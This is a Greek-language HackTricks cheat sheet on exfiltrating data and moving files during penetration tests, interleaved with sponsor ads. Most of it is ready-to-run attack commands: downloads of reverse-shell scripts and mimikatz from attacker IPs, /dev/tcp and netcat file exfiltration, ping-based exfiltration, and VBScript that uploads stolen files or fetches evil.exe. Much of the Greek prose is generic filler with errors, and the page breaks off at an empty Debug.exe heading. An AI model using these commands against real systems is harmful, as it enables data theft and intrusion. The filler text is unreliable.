# Εξαγωγή

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Βρείτε ευπάθειες που είναι πιο σημαντικές ώστε να μπορείτε να τις διορθώσετε πιο γρήγορα. Ο Intruder παρακολουθεί την επιθετική επιφάνεια σας, εκτελεί προληπτικές απειλητικές αναζητήσεις, εντοπίζει προβλήματα σε ολόκληρο το τεχνολογικό σας στοίχημα, από τις διεπαφές προς τις ιστοσελίδες και τα συστήματα στο cloud. [**Δοκιμάστε το δωρεάν**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) σήμερα.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Συνήθως επιτρεπόμενοι τομείς για την εξαγωγή πληροφοριών

Ελέγξτε το [https://lots-project.com/](https://lots-project.com/) για να βρείτε συνήθως επιτρεπόμενους τομείς που μπορούν να καταχραστούν

## Αντιγραφή\&Επικόλληση Base64

**Linux**
```bash
base64 -w0 <file> #Encode file
base64 -d file #Decode file
```
**Windows**
```
certutil -encode payload.dll payload.b64
certutil -decode payload.b64 payload.dll
```
## HTTP

**Linux**
```bash
wget 10.10.14.14:8000/tcp_pty_backconnect.py -O /dev/shm/.rev.py
wget 10.10.14.14:8000/tcp_pty_backconnect.py -P /dev/shm
curl 10.10.14.14:8000/shell.py -o /dev/shm/shell.py
fetch 10.10.14.14:8000/shell.py #FreeBSD
```
**Windows**
```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64
bitsadmin /transfer transfName /priority high http://example.com/examplefile.pdf C:\downloads\examplefile.pdf

#PS
(New-Object Net.WebClient).DownloadFile("http://10.10.14.2:80/taskkill.exe","C:\Windows\Temp\taskkill.exe")
Invoke-WebRequest "http://10.10.14.2:80/taskkill.exe" -OutFile "taskkill.exe"
wget "http://10.10.14.2/nc.bat.exe" -OutFile "C:\ProgramData\unifivideo\taskkill.exe"

Import-Module BitsTransfer
Start-BitsTransfer -Source $url -Destination $output
#OR
Start-BitsTransfer -Source $url -Destination $output -Asynchronous
```
### Μεταφόρτωση αρχείων

* [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
* [**SimpleHttpServer εκτύπωση GET και POST (επίσης headers)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
* Ενότητα Python [uploadserver](https://pypi.org/project/uploadserver/):
```bash
# Listen to files
python3 -m pip install --user uploadserver
python3 -m uploadserver
# With basic auth:
# python3 -m uploadserver --basic-auth hello:world

# Send a file
curl -X POST http://HOST/upload -H -F 'files=@file.txt'
# With basic auth:
# curl -X POST http://HOST/upload -H -F 'files=@file.txt' -u hello:world
```
### **Διακομιστής HTTPS**

Ένας διακομιστής HTTPS είναι ένας διακομιστής που χρησιμοποιεί το πρωτόκολλο HTTPS για την ασφαλή μεταφορά δεδομένων μέσω του Διαδικτύου. Το HTTPS χρησιμοποιεί το πρωτόκολλο SSL/TLS για την κρυπτογράφηση των δεδομένων και την εξασφάλιση της αυθεντικότητας του διακομιστή.

Ένας διακομιστής HTTPS μπορεί να χρησιμοποιηθεί για την αποστολή και λήψη δεδομένων μεταξύ πελατών και διακομιστή με ασφάλεια. Η χρήση του HTTPS είναι ιδιαίτερα σημαντική όταν απαιτείται η προστασία ευαίσθητων πληροφοριών, όπως προσωπικά δεδομένα ή πιστωτικές κάρτες.

Για να δημιουργήσετε έναν διακομιστή HTTPS, πρέπει να αποκτήσετε ένα πιστοποιητικό SSL/TLS από μια αξιόπιστη αρχή πιστοποίησης. Το πιστοποιητικό αυτό επιβεβαιώνει την αυθεντικότητα του διακομιστή και επιτρέπει την κρυπτογράφηση των δεδομένων που ανταλλάσσονται μεταξύ του πελάτη και του διακομιστή.

Με τη χρήση ενός διακομιστή HTTPS, μπορείτε να εξασφαλίσετε την απορρήτου των δεδομένων που μεταφέρονται μέσω του Διαδικτύου και να προστατεύσετε τους χρήστες σας από επιθέσεις όπως η παρακολούθηση της κίνησης δεδομένων ή η παραποίηση του διακομιστή.
```python
# from https://gist.github.com/dergachev/7028596
# taken from http://www.piware.de/2011/01/creating-an-https-server-in-python/
# generate server.xml with the following command:
#    openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
# run as follows:
#    python simple-https-server.py
# then in your browser, visit:
#    https://localhost:443

### PYTHON 2
import BaseHTTPServer, SimpleHTTPServer
import ssl

httpd = BaseHTTPServer.HTTPServer(('0.0.0.0', 443), SimpleHTTPServer.SimpleHTTPRequestHandler)
httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)
httpd.serve_forever()
###

### PYTHON3
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl

httpd = HTTPServer(('0.0.0.0', 443), BaseHTTPRequestHandler)
httpd.socket = ssl.wrap_socket(httpd.socket, certfile="./server.pem", server_side=True)
httpd.serve_forever()
###

### USING FLASK
from flask import Flask, redirect, request
from urllib.parse import quote
app = Flask(__name__)
@app.route('/')
def root():
print(request.get_json())
return "OK"
if __name__ == "__main__":
app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
###
```
## FTP

### Διακομιστής FTP (python)

```python
import socket
import os

def send_file(file_path, host, port):
    # Ανοίξτε το αρχείο για ανάγνωση σε δυαδική μορφή
    with open(file_path, 'rb') as file:
        # Δημιουργήστε ένα νέο socket
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # Συνδεθείτε στον FTP server
        s.connect((host, port))
        # Αποστολή του ονόματος του αρχείου
        s.send(os.path.basename(file_path).encode())
        # Αποστολή του περιεχομένου του αρχείου
        s.sendall(file.read())
        # Κλείστε τη σύνδεση
        s.close()

def main():
    # Ορίστε τον FTP server
    host = 'ftp.example.com'
    port = 21
    # Ορίστε το αρχείο που θέλετε να στείλετε
    file_path = '/path/to/file.txt'
    # Αποστολή του αρχείου
    send_file(file_path, host, port)

if __name__ == '__main__':
    main()
```

Αυτός ο κώδικας σε Python σας επιτρέπει να στείλετε ένα αρχείο σε έναν FTP server. Ανοίγει το αρχείο για ανάγνωση σε δυαδική μορφή και στέλνει το όνομα και το περιεχόμενο του αρχείου στον FTP server. Αυτός ο κώδικας μπορεί να χρησιμοποιηθεί για την εξαγωγή αρχείων από έναν υπολογιστή σε έναν απομακρυσμένο FTP server.
```bash
pip3 install pyftpdlib
python3 -m pyftpdlib -p 21
```
### FTP διακομιστής (NodeJS)

Ο FTP διακομιστής (NodeJS) είναι ένας διακομιστής που χρησιμοποιεί το πρωτόκολλο FTP για τη μεταφορά αρχείων μεταξύ ενός πελάτη και ενός διακομιστή. Ο διακομιστής αυτός υλοποιείται σε NodeJS, μια πλατφόρμα ανάπτυξης εφαρμογών JavaScript που εκτελείται στην πλευρά του διακομιστή.

Ο FTP διακομιστής (NodeJS) παρέχει μια διεπαφή για τη διαχείριση των αρχείων και των φακέλων που αποθηκεύονται στον διακομιστή. Οι πελάτες μπορούν να συνδεθούν στον διακομιστή χρησιμοποιώντας έναν FTP πελάτη και να αναζητήσουν, να λάβουν ή να αποστείλουν αρχεία.

Ο FTP διακομιστής (NodeJS) μπορεί να χρησιμοποιηθεί για διάφορους σκοπούς, όπως η ανταλλαγή αρχείων μεταξύ χρηστών, η δημιουργία αντιγράφων ασφαλείας αρχείων ή η αποθήκευση αρχείων σε απομακρυσμένους διακομιστές.

Για να εκτελέσετε έναν FTP διακομιστή (NodeJS), πρέπει να εγκαταστήσετε το NodeJS στον διακομιστή σας και να δημιουργήσετε έναν κατάλογο για την αποθήκευση των αρχείων. Στη συνέχεια, μπορείτε να χρησιμοποιήσετε τον κώδικα που παρέχεται για να δημιουργήσετε τον FTP διακομιστή και να τον ρυθμίσετε σύμφωνα με τις ανάγκες σας.

Αφού εκτελέσετε τον FTP διακομιστή (NodeJS), οι πελάτες μπορούν να συνδεθούν σε αυτόν χρησιμοποιώντας έναν FTP πελάτη και να ανταλλάξουν αρχεία με τον διακομιστή. Ο διακομιστής παρέχει επίσης δυνατότητες για τη διαχείριση των χρηστών και των δικαιωμάτων πρόσβασης στα αρχεία.

Ο FTP διακομιστής (NodeJS) είναι ένα ευέλικτο εργαλείο που μπορεί να χρησιμοποιηθεί για την αποτελεσματική μεταφορά αρχείων μεταξύ πελατών και διακομιστή. Με τη σωστή ρύθμιση και διαχείριση, μπορεί να παρέχει ασφαλή και αξιόπιστη ανταλλαγή αρχείων.
```
sudo npm install -g ftp-srv --save
ftp-srv ftp://0.0.0.0:9876 --root /tmp
```
### Διακομιστής FTP (pure-ftp)

Ο διακομιστής FTP (pure-ftp) είναι ένα πρωτόκολλο που χρησιμοποιείται για τη μεταφορά αρχείων μεταξύ ενός πελάτη και ενός διακομιστή. Μπορεί να χρησιμοποιηθεί και για την εξαγωγή δεδομένων από έναν διακομιστή.

Για να εξαγάγετε δεδομένα από έναν διακομιστή FTP (pure-ftp), μπορείτε να χρησιμοποιήσετε τις παρακάτω μεθόδους:

1. Εκτέλεση ενός απλού αιτήματος RETR για να κατεβάσετε ένα αρχείο από τον διακομιστή.
2. Χρήση της μεθόδου LIST για να λάβετε μια λίστα με τα αρχεία που βρίσκονται στον διακομιστή.
3. Χρήση της μεθόδου NLST για να λάβετε μια απλή λίστα με τα ονόματα των αρχείων που βρίσκονται στον διακομιστή.
4. Χρήση της μεθόδου STOR για να αποστείλετε ένα αρχείο στον διακομιστή.

Αυτές οι μεθόδοι μπορούν να χρησιμοποιηθούν για να εξαγάγετε δεδομένα από έναν διακομιστή FTP (pure-ftp) και να τα μεταφέρετε σε έναν άλλο διακομιστή ή να τα αποθηκεύσετε σε έναν τοπικό υπολογιστή.
```bash
apt-get update && apt-get install pure-ftp
```

```bash
#Run the following script to configure the FTP server
#!/bin/bash
groupadd ftpgroup
useradd -g ftpgroup -d /dev/null -s /etc ftpuser
pure-pwd useradd fusr -u ftpuser -d /ftphome
pure-pw mkdb
cd /etc/pure-ftpd/auth/
ln -s ../conf/PureDB 60pdb
mkdir -p /ftphome
chown -R ftpuser:ftpgroup /ftphome/
/etc/init.d/pure-ftpd restart
```
### **Πελάτης Windows**

Ο πελάτης Windows αποτελεί ένα από τα πιο δημοφιλή περιβάλλοντα λειτουργίας για υπολογιστές. Είναι σημαντικό να γνωρίζουμε τις τεχνικές εξυπρέτησης που μπορούμε να χρησιμοποιήσουμε για να αποκτήσουμε πρόσβαση σε έναν πελάτη Windows και να εξαγάγουμε δεδομένα από αυτόν.

Οι τεχνικές εξυπρέτησης που μπορούμε να χρησιμοποιήσουμε περιλαμβάνουν:

- Εκμετάλλευση ευπάθειας του λειτουργικού συστήματος
- Χρήση κακόβουλου λογισμικού
- Κλοπή διαπιστευτηρίων
- Χρήση κοινωνικής μηχανικής
- Αξιοποίηση αδυναμιών στις ρυθμίσεις ασφαλείας
- Εκμετάλλευση ευπάθειας εφαρμογών

Με τη χρήση αυτών των τεχνικών, μπορούμε να αποκτήσουμε πρόσβαση σε έναν πελάτη Windows και να εξαγάγουμε δεδομένα από αυτόν. Είναι σημαντικό να είμαστε προσεκτικοί και να λαμβάνουμε όλα τα απαραίτητα μέτρα προφύλαξης για να μην αποκαλυφθούμε κατά τη διάρκεια της εξυπρέτησης.
```bash
#Work well with python. With pure-ftp use fusr:ftp
echo open 10.11.0.41 21 > ftp.txt
echo USER anonymous >> ftp.txt
echo anonymous >> ftp.txt
echo bin >> ftp.txt
echo GET mimikatz.exe >> ftp.txt
echo bye >> ftp.txt
ftp -n -v -s:ftp.txt
```
<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Βρείτε ευπάθειες που είναι πιο σημαντικές, ώστε να μπορείτε να τις διορθώσετε πιο γρήγορα. Ο Intruder παρακολουθεί την επιθετική επιφάνεια σας, εκτελεί προληπτικές απειλητικές αναζητήσεις, εντοπίζει προβλήματα σε ολόκληρο το τεχνολογικό σας στοίβα, από τις διεπαφές προς τις ιστοσελίδες και τα συστήματα στον νέφος. [**Δοκιμάστε το δωρεάν**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) σήμερα.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## SMB

Kali ως διακομιστής
```bash
kali_op1> impacket-smbserver -smb2support kali `pwd` # Share current directory
kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
#For new Win10 versions
impacket-smbserver -smb2support -user test -password test test `pwd`
```
Ή δημιουργήστε ένα κοινόχρηστο smb **χρησιμοποιώντας το samba**:
```bash
apt-get install samba
mkdir /tmp/smb
chmod 777 /tmp/smb
#Add to the end of /etc/samba/smb.conf this:
[public]
comment = Samba on Ubuntu
path = /tmp/smb
read only = no
browsable = yes
guest ok = Yes
#Start samba
service smbd restart
```
# Απομάκρυνση Πληροφοριών

Η απομάκρυνση πληροφοριών αποτελεί μια σημαντική διαδικασία στον κόσμο της χάκερ. Αυτή η διαδικασία αναφέρεται στην εξαγωγή δεδομένων από έναν στόχο χωρίς την επίγνωση του χρήστη. Στην περίπτωση των επιθέσεων σε συστήματα Windows, υπάρχουν διάφορες τεχνικές που μπορούν να χρησιμοποιηθούν για την απομάκρυνση πληροφοριών.

## Τεχνικές Απομάκρυνσης Πληροφοριών σε Συστήματα Windows

Παρακάτω παρουσιάζονται μερικές από τις συνηθέστερες τεχνικές απομάκρυνσης πληροφοριών που μπορούν να χρησιμοποιηθούν σε συστήματα Windows:

### 1. Αποστολή Δεδομένων μέσω Ηλεκτρονικού Ταχυδρομείου

Μια από τις πιο απλές τεχνικές απομάκρυνσης πληροφοριών είναι η αποστολή των δεδομένων μέσω ηλεκτρονικού ταχυδρομείου. Ο χάκερ μπορεί να χρησιμοποιήσει έναν SMTP (Simple Mail Transfer Protocol) server για να στείλει τα δεδομένα σε έναν εξωτερικό λογαριασμό ηλεκτρονικού ταχυδρομείου.

### 2. Χρήση Εξωτερικών Υπηρεσιών Αποθήκευσης

Ο χάκερ μπορεί επίσης να χρησιμοποιήσει εξωτερικές υπηρεσίες αποθήκευσης, όπως το Dropbox ή το Google Drive, για να αποθηκεύσει τα δεδομένα που έχει αποκτήσει από τον στόχο. Αυτό του επιτρέπει να έχει πρόσβαση στα δεδομένα από οπουδήποτε και οποιαδήποτε συσκευή.

### 3. Χρήση Κρυπτογράφησης

Η κρυπτογράφηση είναι μια άλλη τεχνική που μπορεί να χρησιμοποιηθεί για την απομάκρυνση πληροφοριών. Ο χάκερ μπορεί να κρυπτογραφήσει τα δεδομένα πριν τα αποστείλει, προσθέτοντας ένα επιπλέον επίπεδο ασφάλειας.

## Συμπεράσματα

Η απομάκρυνση πληροφοριών είναι μια σημαντική διαδικασία στον κόσμο της χάκερ. Με τη χρήση διάφορων τεχνικών, ο χάκερ μπορεί να εξάγει δεδομένα από ένα σύστημα Windows χωρίς να αφήσει ίχνη. Είναι σημαντικό για τους επαγγελματίες ασφάλειας να είναι ενήμεροι για αυτές τις τεχνικές, προκειμένου να προστατεύσουν τα συστήματά τους από τέτοιου είδους επιθέσεις.
```bash
CMD-Wind> \\10.10.14.14\path\to\exe
CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials

WindPS-1> New-PSDrive -Name "new_disk" -PSProvider "FileSystem" -Root "\\10.10.14.9\kali"
WindPS-2> cd new_disk:
```
## SCP

Ο επιτιθέμενος πρέπει να έχει ενεργοποιημένο το SSHd.
```bash
scp <username>@<Attacker_IP>:<directory>/<filename>
```
## SSHFS

Αν ο θύμα έχει SSH, ο επιτιθέμενος μπορεί να προσαρτήσει έναν κατάλογο από το θύμα στον επιτιθέμενο.
```bash
sudo apt-get install sshfs
sudo mkdir /mnt/sshfs
sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP address>:<Full path to folder>/ /mnt/sshfs/
```
## NC

Το NC (Netcat) είναι ένα πολύ ισχυρό εργαλείο που χρησιμοποιείται για την επικοινωνία μεταξύ δικτυωμένων συσκευών. Μπορεί να χρησιμοποιηθεί για την ανάγνωση και εγγραφή δεδομένων από και προς έναν διακομιστή. Επίσης, μπορεί να χρησιμοποιηθεί για την εκτέλεση εντολών σε απομακρυσμένους υπολογιστές.

Για να συνδεθείτε σε έναν διακομιστή χρησιμοποιώντας το NC, μπορείτε να χρησιμοποιήσετε την εξής εντολή:

```
nc <διεύθυνση IP> <αριθμός θύρας>
```

Αν ο διακομιστής είναι ανοιχτός και ακούει στη συγκεκριμένη θύρα, τότε θα συνδεθείτε με επιτυχία. Αφού συνδεθείτε, μπορείτε να ανταλλάξετε δεδομένα με τον διακομιστή.

Για να δημιουργήσετε έναν διακομιστή χρησιμοποιώντας το NC, μπορείτε να χρησιμοποιήσετε την εξής εντολή:

```
nc -l -p <αριθμός θύρας>
```

Αυτή η εντολή θα ακούει στη συγκεκριμένη θύρα και θα περιμένει για συνδέσεις από πελάτες. Όταν ένας πελάτης συνδεθεί, μπορείτε να ανταλλάξετε δεδομένα μεταξύ του διακομιστή και του πελάτη.

Το NC μπορεί επίσης να χρησιμοποιηθεί για την αποστολή και λήψη αρχείων μεταξύ διακομιστή και πελάτη. Για παράδειγμα, μπορείτε να στείλετε ένα αρχείο από τον διακομιστή στον πελάτη χρησιμοποιώντας την εξής εντολή:

```
nc -l -p <αριθμός θύρας> < αρχείο
```

Αυτή η εντολή θα στείλει το περιεχόμενο του αρχείου στον πελάτη μόλις συνδεθεί.

Το NC είναι ένα πολύ χρήσιμο εργαλείο για την εξυπηρέτηση πολλών σκοπών κατά τη διάρκεια μιας επίθεσης. Μπορεί να χρησιμοποιηθεί για την εξαγωγή δεδομένων, την εκτέλεση εντολών και την ανταλλαγή αρχείων μεταξύ διακομιστή και πελάτη.
```bash
nc -lvnp 4444 > new_file
nc -vn <IP> 4444 < exfil_file
```
```bash
cat /path/to/file > /dev/tcp/<attacker_ip>/<attacker_port>
```

Μπορείτε να κατεβάσετε ένα αρχείο από το θύμα χρησιμοποιώντας την παρακάτω εντολή:

```bash
cat /path/to/file > /dev/tcp/<attacker_ip>/<attacker_port>
```
```bash
nc -lvnp 80 > file #Inside attacker
cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
```
### Μεταφόρτωση αρχείου στο θύμα

Μια από τις μεθόδους που μπορείτε να χρησιμοποιήσετε για να μεταφορτώσετε ένα αρχείο στο θύμα είναι μέσω της εκτέλεσης κώδικα στον υπολογιστή του θύματος. Μπορείτε να εκμεταλλευτείτε τυχόν ευπάθειες στο λογισμικό που χρησιμοποιεί ο υπολογιστής του θύματος για να εκτελέσετε κώδικα που θα πραγματοποιήσει τη μεταφόρτωση του αρχείου.

Μια άλλη μέθοδος είναι να χρησιμοποιήσετε μια ευπάθεια σε μια εφαρμογή που χρησιμοποιεί το θύμα για να μεταφορτώσετε το αρχείο. Μπορείτε να εκμεταλλευτείτε την ευπάθεια για να ανεβάσετε το αρχείο στον διακομιστή της εφαρμογής και στη συνέχεια να το κατεβάσετε από εκεί.

Μια τρίτη μέθοδος είναι να χρησιμοποιήσετε μια υπηρεσία αποθήκευσης αρχείων στον ιστό. Μπορείτε να ανεβάσετε το αρχείο σε μια υπηρεσία όπως το Dropbox ή το Google Drive και στη συνέχεια να μοιραστείτε τον σύνδεσμο λήψης με το θύμα.

Ανεξάρτητα από τη μέθοδο που επιλέξετε, είναι σημαντικό να εξασφαλίσετε ότι ο υπολογιστής σας είναι ασφαλής και ότι η μεταφορτωμένη πληροφορία δεν θα διαρρεύσει.
```bash
nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
# Inside victim
exec 6< /dev/tcp/10.10.10.10/4444
cat <&6 > file.txt
```
Ευχαριστώ τον **@BinaryShadow\_**

## **ICMP**
```bash
# To exfiltrate the content of a file via pings you can do:
xxd -p -c 4 /path/file/exfil | while read line; do ping -c 1 -p $line <IP attacker>; done
#This will 4bytes per ping packet (you could probably increase this until 16)
```

```python
from scapy.all import *
#This is ippsec receiver created in the HTB machine Mischief
def process_packet(pkt):
if pkt.haslayer(ICMP):
if pkt[ICMP].type == 0:
data = pkt[ICMP].load[-4:] #Read the 4bytes interesting
print(f"{data.decode('utf-8')}", flush=True, end="")

sniff(iface="tun0", prn=process_packet)
```
## **SMTP**

Εάν μπορείτε να στείλετε δεδομένα σε έναν διακομιστή SMTP, μπορείτε να δημιουργήσετε έναν SMTP για να λάβετε τα δεδομένα με τη χρήση της Python:
```bash
sudo python -m smtpd -n -c DebuggingServer :25
```
## TFTP

Από προεπιλογή στα XP και 2003 (σε άλλα πρέπει να προστεθεί ρητά κατά την εγκατάσταση)

Στο Kali, **ξεκινήστε τον διακομιστή TFTP**:
```bash
#I didn't get this options working and I prefer the python option
mkdir /tftp
atftpd --daemon --port 69 /tftp
cp /path/tp/nc.exe /tftp
```
**Διακομιστής TFTP σε Python:**

```python
import socket
import struct

def tftp_server():
    # Create a UDP socket
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    server_socket.bind(('0.0.0.0', 69))

    while True:
        # Receive the request packet
        data, client_address = server_socket.recvfrom(516)
        opcode = struct.unpack('!H', data[:2])[0]

        # Check if it is a read request (RRQ)
        if opcode == 1:
            # Extract the filename from the request
            filename = data[2:data.index(b'\x00', 2)].decode('utf-8')

            # Open the file and read its contents
            try:
                with open(filename, 'rb') as file:
                    file_data = file.read()
            except FileNotFoundError:
                # Send an error packet if the file is not found
                error_packet = struct.pack('!HH', 5, 1) + b'File not found'
                server_socket.sendto(error_packet, client_address)
                continue

            # Split the file data into blocks of 512 bytes
            blocks = [file_data[i:i+512] for i in range(0, len(file_data), 512)]

            # Send the file data in blocks
            for i, block in enumerate(blocks):
                # Create the data packet
                data_packet = struct.pack('!HH', 3, i+1) + block

                # Send the data packet to the client
                server_socket.sendto(data_packet, client_address)

                # Wait for the acknowledgment packet
                ack_packet, _ = server_socket.recvfrom(4)
                ack_opcode = struct.unpack('!H', ack_packet[:2])[0]
                ack_block = struct.unpack('!H', ack_packet[2:])[0]

                # Check if the acknowledgment is correct
                if ack_opcode != 4 or ack_block != i+1:
                    # Resend the data packet
                    server_socket.sendto(data_packet, client_address)

        # Check if it is a write request (WRQ)
        elif opcode == 2:
            # Extract the filename from the request
            filename = data[2:data.index(b'\x00', 2)].decode('utf-8')

            # Receive the file data in blocks
            file_data = b''
            block_number = 1

            while True:
                # Wait for the data packet
                data_packet, _ = server_socket.recvfrom(516)
                data_opcode = struct.unpack('!H', data_packet[:2])[0]
                data_block = struct.unpack('!H', data_packet[2:4])[0]

                # Check if the data packet is correct
                if data_opcode != 3 or data_block != block_number:
                    # Send an acknowledgment packet with the previous block number
                    ack_packet = struct.pack('!HH', 4, block_number-1)
                    server_socket.sendto(ack_packet, client_address)
                    continue

                # Extract the data from the packet
                data = data_packet[4:]

                # Append the data to the file
                file_data += data

                # Send an acknowledgment packet
                ack_packet = struct.pack('!HH', 4, block_number)
                server_socket.sendto(ack_packet, client_address)

                # Check if it is the last block
                if len(data) < 512:
                    break

                # Increment the block number
                block_number += 1

            # Write the file data to disk
            with open(filename, 'wb') as file:
                file.write(file_data)

    # Close the server socket
    server_socket.close()

if __name__ == '__main__':
    tftp_server()
```

Ο παραπάνω κώδικας είναι ένα παράδειγμα ενός διακομιστή TFTP που υλοποιείται σε Python. Ο διακομιστής αυτός είναι ικανός να διαχειριστεί αιτήσεις ανάγνωσης (RRQ) και εγγραφής (WRQ) αρχείων. Ο κώδικας χρησιμοποιεί το πρωτόκολλο UDP για την ανταλλαγή δεδομένων μεταξύ του διακομιστή και των πελατών.

Για να χρησιμοποιήσετε τον διακομιστή TFTP, απλά εκτελέστε τον κώδικα σε ένα μηχάνημα με εγκατεστημένη την Python. Ο διακομιστής θα ακούει στην IP διεύθυνση `0.0.0.0` και στη θύρα `69`. Όταν λάβει μια αίτηση ανάγνωσης ή εγγραφής αρχείου, θα ανταποκριθεί ανάλογα και θα ανταλλάξει τα απαραίτητα πακέτα με τον πελάτη.

Προσέξτε ότι ο κώδικας υποθέτει ότι οι αιτήσεις και οι απαντήσεις θα είναι σωστές και δεν περιλαμβάνει μηχανισμούς ελέγχου σφαλμάτων. Επίσης, ο κώδικας δεν περιορίζει την πρόσβαση σε αρχεία, οπότε πρέπει να ληφθούν κατάλληλα μέτρα ασφαλείας για να αποτραπεί η παραβίαση του συστήματος αρχείων.
```bash
pip install ptftpd
ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
```
Στο **θύμα**, συνδεθείτε στον διακομιστή Kali:
```bash
tftp -i <KALI-IP> get nc.exe
```
## PHP

Κατεβάστε ένα αρχείο με έναν PHP oneliner:
```bash
echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
```
## VBScript

VBScript (Visual Basic Scripting Edition) είναι μια γλώσσα προγραμματισμού που χρησιμοποιείται για την αυτοματοποίηση εργασιών στο περιβάλλον των Windows. Μπορεί να χρησιμοποιηθεί για την εκτέλεση εντολών συστήματος, τη διαχείριση αρχείων και φακέλων, καθώς και για την αλληλεπίδραση με άλλες εφαρμογές.

Μια από τις χρήσεις του VBScript στον χώρο του χάκινγκ είναι η εξαγωγή δεδομένων από έναν στόχο. Αυτό μπορεί να γίνει με τη χρήση της μεθόδου `CreateObject` για να δημιουργήσετε ένα αντικείμενο που θα επικοινωνήσει με έναν εξωτερικό πόρο, όπως έναν διακομιστή HTTP ή έναν FTP διακομιστή.

Για παράδειγμα, μπορείτε να χρησιμοποιήσετε τον παρακάτω κώδικα VBScript για να εξάγετε το περιεχόμενο ενός αρχείου και να το αποθηκεύσετε σε έναν εξωτερικό διακομιστή FTP:

```vbscript
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objFile = objFSO.OpenTextFile("C:\path\to\file.txt", 1)
strData = objFile.ReadAll
objFile.Close

Set objFTP = CreateObject("Microsoft.XMLHTTP")
objFTP.Open "PUT", "ftp://example.com/file.txt", False
objFTP.Send strData
```

Σε αυτό το παράδειγμα, ο κώδικας ανοίγει ένα αρχείο κειμένου, διαβάζει το περιεχόμενό του και το αποθηκεύει στο αντικείμενο `strData`. Έπειτα, χρησιμοποιεί το αντικείμενο `objFTP` για να στείλει τα δεδομένα στον εξωτερικό διακομιστή FTP με τη μέθοδο `PUT`.

Με τη χρήση του VBScript, μπορείτε να εξάγετε δεδομένα από οποιοδήποτε αρχείο ή πηγή και να τα αποστείλετε σε έναν εξωτερικό πόρο, όπως έναν διακομιστή FTP ή έναν διακομιστή HTTP. Αυτή η τεχνική μπορεί να χρησιμοποιηθεί για την απόκτηση ευαίσθητων πληροφοριών από έναν στόχο και την εξαγωγή τους για περαιτέρω ανάλυση ή εκμετάλλευση.
```bash
Attacker> python -m SimpleHTTPServer 80
```
**Θύμα**
```bash
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http =CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
```

```bash
cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
```
## Debug.exe

